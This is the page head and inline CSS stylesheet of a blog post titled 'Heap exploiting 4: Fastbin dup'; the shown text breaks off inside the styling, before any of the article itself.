<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Heap exploiting 4: Fastbin dup</title>
  <meta name='description' content='This blog is a means to share my research.'>

  <link rel="canonical" href="http://localhost:4000/new_blog/heap-exploiting-4/">
  <link rel="alternate" type="application/rss+xml" title="What&#39;s upsecurity" href="/new_blog/feed.xml">

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css?family=Nunito:400,700" rel="stylesheet">
  <!-- Ionicons -->
  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">



  <style>
  
  /*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace, monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace, monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:0.35em 0.75em 0.625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:15px}ul,ol,dd{margin-left:15px}.highlight{background:#2C2F36}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#aaa}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .na{color:#008080}.highlight .nb{color:#0086B3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:#008080}.highlight .ni{color:#800080}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:#000080}.highlight .nv{color:#008080}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#6d1}.highlight .sc{color:#6d1}.highlight .sd{color:#6d1}.highlight .s2{color:#6d1}.highlight .se{color:#6d1}.highlight .sh{color:#6d1}.highlight .si{color:#6d1}.highlight .sx{color:#6d1}.highlight .sr{color:#009926}.highlight .s1{color:#6d1}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:#008080}.highlight .vg{color:#008080}.highlight .vi{color:#008080}.highlight .il{color:#099}.container{max-width:1200px;padding-left:15px;padding-right:15px;margin:0 auto}.container-full{max-width:100%;padding-left:15px;padding-right:15px;margin:0 auto}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-15px;margin-right:-15px}.col{padding-left:15px;padding-right:15px}[class^="col-"]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media (min-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (min-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (min-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (min-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (min-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (min-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (min-width: 992px){.d-hide{display:none !important}.d-show{display:block !important}}*,*::after,*::before{box-sizing:border-box}body{font-family:"Nunito",sans-serif;font-size:16px;line-height:28px;color:#C9D3E7;background:#2C2F36;overflow-x:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}body input,body textarea{border:#3E4250 1px solid;outline:none}body input:focus:required:invalid,body textarea:focus:required:invalid{border-color:#e02f40}body input:required:valid,body textarea:required:valid{border-color:#34a74e}::placeholder{color:#666}*::selection{color:#fff;background-color:#1ABC9C}h1,h2,h3,h4,h5,h6{line-height:initial}h1{font-size:36px}h2{font-size:28px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}blockquote{padding-left:15px;border-left:3px solid #1ABC9C;font-style:normal}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}img{max-width:100%;height:auto;vertical-align:middle}img+em{text-align:center;display:block;margin-top:10px;font-weight:normal;font-size:16px;color:#707890}a{text-decoration:none;color:#1ABC9C;transition:.35s}a:hover{color:#3ee4c4}hr{display:block;height:2px;padding:0;margin:30px 0;line-height:0;border:0;background-color:#3E4250}blockquote{padding:15px 15px 15px 30px;font-size:18px;font-style:normal;border-left:4px solid #1ABC9C}blockquote p{margin-bottom:0}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}.table-container{max-width:100%;overflow-x:auto}table{font-size:12px;color:#101010;width:100%;border-width:1px;border-color:#707890;border-collapse:collapse}table th{padding:8px;font-size:16px;text-align:left;border:1px solid #707890;color:#fff;background-color:#1ABC9C}table tr{background-color:#c5f7ed;transition:all .3s ease}table tr:nth-child(even){background-color:#fff}table td{padding:8px;font-size:14px;border:1px solid #707890}table tr:hover{background-color:#fff}.preloader{position:fixed;top:0;left:0;right:0;bottom:0;z-index:999;overflow:hidden;background:#101010}.loader{position:absolute;top:50%;left:50%;transform:translate(-50%, -50%);padding:10px;font-family:'Nunito', sans-serif;font-size:21px;letter-spacing:.5em;text-transform:uppercase;font-weight:700;color:#fff;background:#101010}.loader span{color:#fff;mix-blend-mode:difference}.loader:before{content:'';position:absolute;top:0;left:0;width:60px;height:100%;background:#fff;animation:animate 3s linear infinite}@keyframes animate{0%{left:0}50%{left:calc(100% - 70px)}100%{left:0}}.button{display:inline-block;white-space:nowrap;vertical-align:middle;font:inherit;text-align:center;padding:8px 30px;border-radius:3px;cursor:pointer;transition:.35s}.button--primary{color:#fff;background-color:#1ABC9C}.button--primary:hover{background-color:#117964;color:#fff;transition:.35s}.button--big{display:block;width:100%}.sidebar{margin-bottom:30px}.widget{padding:40px 15px;margin-bottom:30px;background:rgba(35,36,39,0.95);box-shadow:0 9px 18px 0 rgba(0,0,0,0.25)}.widget .widget-title{position:relative;padding-bottom:15px;margin-bottom:20px;font-size:21px;text-align:center}.widget .widget-title:after{content:"";position:absolute;left:50%;bottom:0;transform:translateX(-50%);display:block;width:50px;height:2px;background:#3E4250}.recent-posts{display:flex;flex-wrap:wrap;align-items:center;margin-bottom:15px}.recent-posts:hover .recent-image::before{background:rgba(0,0,0,0.15);transition:all .5s ease}.recent-posts:hover .recent-content .recent-title a{color:#3ee4c4}.recent-posts:last-child{margin-bottom:0}.recent-posts .recent-header{width:100%;margin-bottom:10px;background:#101010}.recent-posts .recent-header.reveal-in .recent-image{opacity:1}.recent-posts .recent-image{position:relative;display:block;width:100%;height:220px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);opacity:0;transition:all 1s cubic-bezier(0.6, 0.3, 0, 1)}.recent-posts .recent-image:after{content:"";display:table;padding-top:20%}.recent-posts .recent-image:before{content:"";position:absolute;width:100%;height:100%;transition:all .5s ease}.recent-posts .recent-content{margin:5px 0}.recent-posts .recent-content .recent-title{margin-bottom:0;font-weight:700}.recent-posts .recent-content .recent-title a{font-size:18px;color:#C9D3E7}.recent-posts .recent-content .recent-date{font-size:12px;color:#707890}.social-profiles{text-align:center}.social-profiles .social-profiles-item{display:inline-block;margin:3px}.social-profiles .social-profiles-link{display:inline-block;line-height:16px;padding:8px 10px;border:1px solid #3E4250;border-radius:3px;color:#3E4250}.social-profiles .social-profiles-link:hover{border-color:#1ABC9C;color:#1ABC9C}.social-profiles .social-profiles-link i{font-size:18px}.widget-instagram .instagram-box{text-align:center}.widget-instagram .instagram-box .instagram-grid{margin-bottom:30px}.widget-instagram .instagram-box .instagram-item{width:33.333%;padding:3px;float:left;overflow:hidden}.widget-instagram .instagram-box .instagram-item a{position:relative;display:block}.widget-instagram .instagram-box .instagram-item a:after{content:"";position:absolute;top:0;display:block;height:100%;width:100%;background:rgba(35,36,39,0.3);transition:.35s}.widget-instagram .instagram-box .instagram-item a:hover:after{background:transparent}.widget-instagram .instagram-box .instagram-prof{font-size:14px;color:#3E4250}.widget-instagram .instagram-box .instagram-prof:hover{text-decoration:underline}.widget-newsletter{text-align:center}.widget-newsletter .newsletter-subtitle{margin-bottom:20px;font-size:18px}.widget-newsletter .newsletter-text{max-width:170px;margin:0 auto 30px;font-size:14px;line-height:19px}.widget-newsletter .newsletter-group-top{position:relative}.widget-newsletter .email-icon{position:absolute;top:50%;left:10px;font-size:22px;transform:translateY(-50%);color:rgba(44,47,54,0.4)}.widget-newsletter .newsletter-email,.widget-newsletter .newsletter-button{width:100%;height:50px;border:none;outline:none}.widget-newsletter .newsletter-email{padding:15px 15px 15px 33px}.widget-newsletter .newsletter-button{margin-top:20px;font-size:14px;font-weight:700;cursor:pointer;color:#fff;background:#2C2F36;transition:.35s}.widget-newsletter .newsletter-button:hover{background:#1ABC9C}.tag-list .tag-item{display:inline-block;margin:3px}.tag-list .tag-item:last-child{margin-right:0}.tag-list .tag-item .tag{display:inline-block;padding:5px 15px;font-size:12px;border-radius:3px;color:#C9D3E7;background:#2C2F36}.tag-list .tag-item .tag:hover{color:#fff;background:#1ABC9C}@media only screen and (min-width: 576px){.widget{padding:40px}}@media only screen and (min-width: 768px){.recent-posts .recent-header{margin-bottom:5px}.recent-posts .recent-image{height:120px}.recent-posts .recent-content .recent-title a{font-size:16px}}@media only screen and (min-width: 992px){.recent-posts{flex-wrap:nowrap}.recent-posts .recent-header{width:auto;margin-right:15px}.recent-posts .recent-image{width:110px}}.pagination{margin:20px 0 40px}.pagination .pagination-list{display:flex;align-items:center;text-align:center}.pagination .pagination-list .older-posts,.pagination .pagination-list .previous-posts,.pagination .pagination-list .newer-posts{display:inline-block;flex-grow:1}.pagination .pagination-list .older-posts .older-link,.pagination .pagination-list .older-posts .previous-link,.pagination .pagination-list .older-posts .newer-link,.pagination .pagination-list .previous-posts .older-link,.pagination .pagination-list .previous-posts .previous-link,.pagination .pagination-list .previous-posts .newer-link,.pagination .pagination-list .newer-posts .older-link,.pagination .pagination-list .newer-posts .previous-link,.pagination .pagination-list .newer-posts .newer-link{display:flex;justify-content:center;align-items:center;padding:20px 35px;font-size:14px;line-height:18px;font-weight:bold;color:#C9D3E7;background:rgba(35,36,39,0.95);transition:.35s}.pagination .pagination-list .older-posts .older-link:hover,.pagination .pagination-list .older-posts .previous-link:hover,.pagination .pagination-list .older-posts .newer-link:hover,.pagination .pagination-list .previous-posts .older-link:hover,.pagination .pagination-list .previous-posts .previous-link:hover,.pagination .pagination-list .previous-posts .newer-link:hover,.pagination .pagination-list .newer-posts .older-link:hover,.pagination .pagination-list .newer-posts .previous-link:hover,.pagination .pagination-list .newer-posts .newer-link:hover{background:rgba(28,29,31,0.95)}.pagination .pagination-list .older-link i{margin-left:10px}.pagination .pagination-list .previous-link i,.pagination .pagination-list .newer-link i{margin-right:10px}@media only screen and (min-width: 768px){.pagination{margin:20px 0}}.footer{padding:50px 0;margin-top:30px;background:#101010}.footer-top{display:flex;justify-content:space-between;align-items:center;padding-bottom:15px;margin-bottom:10px;border-bottom:1px solid #3E4250}.footer-top .logo-text{font-size:16px;font-weight:700;line-height:16px;text-transform:uppercase;letter-spacing:5px;color:#C9D3E7}.footer-top .logo-text:hover{color:#707890}.footer-top .top{display:flex;justify-content:center;align-items:center;width:30px;height:30px;border:1px solid #2C2F36;background-color:#2C2F36;color:#C9D3E7;cursor:pointer;transition:.35s;opacity:.5}.footer-top .top:hover{opacity:1}.footer-bottom{display:flex;align-items:center;flex-wrap:wrap}.footer-bottom .copyright{margin-right:60px}.footer-bottom .copyright p{margin-bottom:0;font-size:13px;color:#707890}.footer-bottom .copyright p a{color:#707890}.footer-bottom .copyright p a:hover{color:#1ABC9C}.footer-bottom .footer-social ul li{display:inline-block;margin-left:15px}.footer-bottom .footer-social ul li:first-child{margin-left:0}.footer-bottom .footer-social ul li a{font-size:13px;font-weight:bold;color:#707890;transition:.35s}.footer-bottom .footer-social ul li a:hover{color:#1ABC9C}.header{margin-bottom:50px;background:#101010}.header,.header-box{height:60px}.header-box{display:flex;flex-direction:row;justify-content:space-between;align-items:center}.header-box .logo-title .logo-text{font-size:16px;font-weight:700;line-height:16px;text-transform:uppercase;letter-spacing:5px;color:#C9D3E7}.header-box .logo-title .logo-text:hover{color:#fff}.nav-menu,.search{position:fixed;top:0;left:0;right:0;bottom:0;transform:scale(0.5);z-index:-1;background:#2C2F36;overflow-y:auto;opacity:0}.nav-menu.active,.search.active{transition:all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);transform:scale(1);z-index:10;opacity:1}.menu-list{max-width:750px;width:100%;margin:5% auto 0;padding:15px;list-style:none;overflow-y:auto}.menu-list .menu-item{text-align:center}.menu-list .menu-link{position:relative;font-size:30px;font-weight:700;line-height:60px;color:#C9D3E7}.menu-list .menu-link:before{content:'';position:absolute;left:0;bottom:0;width:100%;height:5px;pointer-events:none;background:#3DDCA1;transform:scale3d(0, 1, 1);transform-origin:100% 50%;transition:transform 0.35s cubic-bezier(0.8, 0, 0.2, 1)}.menu-list .menu-link:hover:before{transform:scale3d(1, 1, 1);transform-origin:0 50%}.search-close-button{margin:0 auto 50px}.menu-close{margin:20% auto 0}.menu-close,.search-close-button{display:flex;justify-content:center;align-items:center;width:40px;height:40px;font-size:40px;border-radius:50%;border:2px solid #707890;color:#707890;transition:all .35s;cursor:pointer}.menu-close:hover,.search-close-button:hover{border-color:#C9D3E7;color:#C9D3E7}.nav-menu .menu-link,.nav-buttons i.ion{transition:color .35s}.nav-menu .menu-link:hover,.nav-buttons i.ion:hover{color:#fff}.nav-buttons i.ion{margin-left:10px;font-size:20px;vertical-align:middle;color:#C9D3E7;cursor:pointer}.nav-buttons i.ion:first-child{margin-left:0}.search-box{max-width:750px;width:100%;margin:10% auto 0;padding:15px;text-align:center}.search-box .search-text{width:100%;height:60px;margin-bottom:30px;text-align:center;font-size:18px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:#c1c1c7;background:#4f505d}.search-box .search-text::placeholder{color:#c1c1c7}.search-results-list{margin:0}.search-results-list .search-item{margin-bottom:15px;list-style:decimal inside;text-align:left;border-bottom:2px solid #323743;white-space:nowrap}.search-results-list .search-item .search-link{display:inline-block;width:100%;padding:15px;font-size:21px;color:#fff;white-space:normal}.search-results-list .search-item .search-link:hover{color:#707890}.search-results-list .search-no-item{font-size:18px;color:#e02f40;list-style:none}.article-first{background:rgba(35,36,39,0.95);margin-bottom:30px}.article-first .article-image-first{position:relative;display:flex;align-items:flex-end;justify-content:center;min-height:450px;background-size:contain;background-position:center;background-repeat:no-repeat;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25)}.article-first .article-image-first:before{content:"";display:table}.article-first .article-content-first{padding:20px;color:#C9D3E7}.article-first .article-content-first .article-tag .tag{font-size:12px}.article-first .article-content-first .article-date .date{font-size:12px;color:rgba(201,211,231,0.8)}.article-first .article-content-first .article-title{width:50%;margin:0 auto;margin-bottom:20px;font-size:30px;line-height:30px;font-weight:normal}.article-first .article-content-first .article-title a{color:#C9D3E7;transition:.35s}.article-first .article-content-first .article-excerpt{max-width:450px;margin-bottom:30px;font-size:14px;line-height:23px}.article-first .article-content-first .button{font-size:14px;font-weight:700;border:1px solid #c9d3e7;color:#C9D3E7;transition:.35s}.article-first .article-content-first .button:hover{border:1px solid #1ABC9C;background:#1ABC9C;color:#fff}.article{display:flex;margin-bottom:25px}.article:hover .article-image .image-overlay-text{opacity:1}.article:hover .article-image .image-overlay{opacity:.5;width:100%}.article .article-box{padding-bottom:20px;border-bottom:2px solid #3E4250}.article .article-head{background:#101010}.article .article-image{position:relative;display:block;margin-bottom:20px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);background-size:contain}.article .article-image:before{content:"";display:table;padding-top:75%}.article .article-image .image-overlay{position:absolute;top:0;right:0;bottom:0;left:0;width:0;height:100%;background-color:rgba(0,0,0,0.8);opacity:0;transition:all 0.4s ease}.article .article-image .image-overlay-text{position:absolute;top:50%;left:50%;font-size:110px;text-align:center;letter-spacing:2px;color:#C9D3E7;transform:translate(-50%, -50%);transition:all 0.4s ease 0.3s;opacity:0}.article .article-content .article-info{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:5px}.article .article-content .article-info .article-date{font-size:12px;color:rgba(201,211,231,0.8)}.article .article-content .article-info .article-tag .tag{display:inline-block;padding:2px 5px;margin-right:5px;font-size:12px;line-height:18px;font-weight:bold;border:1px solid #1ABC9C;border-radius:3px;text-transform:capitalize;color:#1ABC9C;transition:.35s}.article .article-content .article-info .article-tag .tag:last-child{margin-right:0}.article .article-content .article-info .article-tag .tag:hover{background:#1ABC9C;color:#fff}.article .article-content .article-title{margin-bottom:5px}.article .article-content .article-title a{font-size:24px;color:#C9D3E7}.article .article-content .article-excerpt{margin-bottom:0;font-size:15px;line-height:25px;color:#707890}.article-box{position:relative;overflow:hidden}.article-first .article-image-first,.article-box .article-image{position:relative;opacity:0;transition:all 1s cubic-bezier(0.6, 0.3, 0, 1)}.article-first.reveal-in .article-image-first,.article-box.reveal-in .article-image{opacity:1}@media only screen and (min-width: 576px){.article-first .article-content-first .article-title{font-size:45px;line-height:45px}.article-first .article-content-first .article-excerpt{margin-bottom:50px}.menu-list .menu-link{font-size:50px;line-height:80px}.menu-list .menu-link:before{height:8px}.search-box .search-text{height:80px;margin-bottom:30px;font-size:24px}}@media only screen and (min-width: 768px){.article-first .article-content-first{padding:60px 40px 0}}@media only screen and (min-width: 992px){.nav-menu{position:relative;display:block;transform:none;opacity:1;z-index:10;background:transparent}.nav-menu .menu-list{padding:0;margin:0}.nav-menu .menu-list .menu-item{display:inline-block;margin:0 15px 0 0}.nav-menu .menu-list .menu-item:last-child{margin-right:0}.nav-menu .menu-list .menu-link{font-size:13px;font-weight:700;text-transform:uppercase;line-height:19px}.nav-menu .menu-list .menu-link:before{content:none}.nav-menu .menu-close{display:none}.nav-menu .menu-link,.nav-buttons i.ion{transition:color .35s}.nav-menu .menu-link:hover,.nav-buttons i.ion:hover{color:#fff}}.post{margin-bottom:20px}.post-image-box{background:#101010}.post-image-box.reveal-in .post-image{opacity:1}.post-image{min-height:430px;margin-bottom:30px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);position:relative;opacity:0;transition:all 1s cubic-bezier(0.6, 0.3, 0, 